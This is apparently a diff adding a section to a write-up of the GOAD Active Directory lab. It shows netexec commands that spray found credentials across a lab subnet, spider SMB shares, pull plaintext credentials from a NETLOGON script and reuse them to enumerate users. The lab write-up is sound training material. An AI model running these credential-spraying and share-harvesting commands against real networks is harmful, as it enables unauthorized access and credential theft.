@@ -636,4 +636,27 @@ nxc smb 192.168.56.0/24 -u 'arya.stark' -p 'Needle'
 
 <div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/08-arya-password-confirmation.png'><br><ins>Password Confirmed</ins></div>
 
-NORTH\jeor.mormont : _L0ngCl@w_
+
+What can this Arya account access ? We run nxc once more ...
+
+```bash
+nxc smb 192.168.56.11,22-23 -u 'arya.stark' -p 'Needle' -M spider_plus -o DOWNLOAD_FLAG=True
+```
+
+From that we find the file `NETLOGON/script.ps1`
+
+```powershell
+┌──(qdada㉿Embizweni)-[/tmp/nxc_spider_plus/192.168.56.11/NETLOGON]
+└─$ cat script.ps1
+# fake script in netlogon with creds
+$task = '/c TODO'
+$taskName = "fake task"
+$user = "NORTH\jeor.mormont"
+$password = "_L0ngCl@w_"
+```
+
+Once again the credentials are tested over again ...
+
+```bash
+nxc smb 192.168.56.0/24 -u 'NORTH\jeor.mormont' -p '_L0ngCl@w_' --users
+```
